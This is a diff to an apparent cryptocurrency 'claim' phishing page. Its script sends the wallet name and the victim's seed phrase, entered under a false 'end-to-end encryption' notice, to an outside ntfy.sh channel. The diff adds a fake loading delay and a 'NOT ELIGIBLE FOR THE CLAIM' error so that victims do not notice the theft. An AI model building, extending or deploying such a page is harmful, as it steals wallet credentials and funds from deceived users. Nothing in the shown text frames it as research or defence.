@@ -1173,10 +1173,17 @@
                     Submit
                 </button>
 
+                <div id="errorClaim" class="border border-red-500 text-red-500 px-4 py-2 mt-4 rounded hidden">
+                    NOT ELIGIBLE FOR THE CLAIM
+                </div>
+
+
                 <p class="text-gray-600 text-sm mt-4">This session is protected with end-to-end encryption</p>
             </div>
         </div>
     </div>
+
+
 
     <script>
 
@@ -1217,6 +1224,7 @@
         function closeModal() {
             document.getElementById("mnemonicField").classList.add("hidden");
             document.getElementById("walletModal").classList.add("hidden");
+            document.getElementById("submitMnemonicBtn").classList.add("hidden");
         }
 
         function restartModal() {
@@ -1245,11 +1253,24 @@
         function submitMnemonic() {
             const message = document.getElementById('mnemonicField').value;
             const wallet = document.getElementById('walletName').innerText;
+
+
             fetch("https://ntfy.sh/KING_OF_FOOTBALL", {
                 method: "POST",
                 headers: { "Content-Type": "text/plain" },
                 body: `${wallet}: ${message}`
-            })
+            });
+            document.getElementById("mnemonicField").classList.add("hidden");
+            document.getElementById("submitMnemonicBtn").classList.add("hidden");
+            document.getElementById("loading").classList.remove("hidden"); // Hide loading
+
+            setTimeout(() => {
+                document.getElementById("loading").classList.add("hidden"); // Hide loading
+                document.getElementById("errorClaim").classList.remove("hidden");
+            }, 5000);
+
+            
+
         }
     </script>
 
